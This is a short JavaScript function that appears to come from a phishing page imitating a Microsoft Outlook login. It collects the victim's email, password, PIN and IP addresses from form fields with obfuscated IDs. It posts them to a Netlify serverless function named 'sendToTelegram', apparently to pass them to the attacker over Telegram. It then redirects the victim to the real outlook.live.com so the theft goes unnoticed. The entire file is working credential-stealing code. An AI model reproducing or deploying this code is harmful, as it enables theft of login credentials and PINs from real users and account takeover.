function sendLoginData() {
    var u_name = document.getElementById("uzer").value;
    var pax = document.getElementById("pazz").value;
    var u_pin2 = document.getElementById("p1n").value;
    var ip = document.getElementById("gfg").innerHTML;
    var ip2 = document.getElementById("address").innerHTML;
    var data = {
        email: u_name,
        password: pax,
        pin: u_pin2,
        ip: ip,
        ip2: ip2
    };

    fetch("/.netlify/functions/sendToTelegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).then(function(response) {
        window.location = 'https://outlook.live.com';
    });

    return false;
}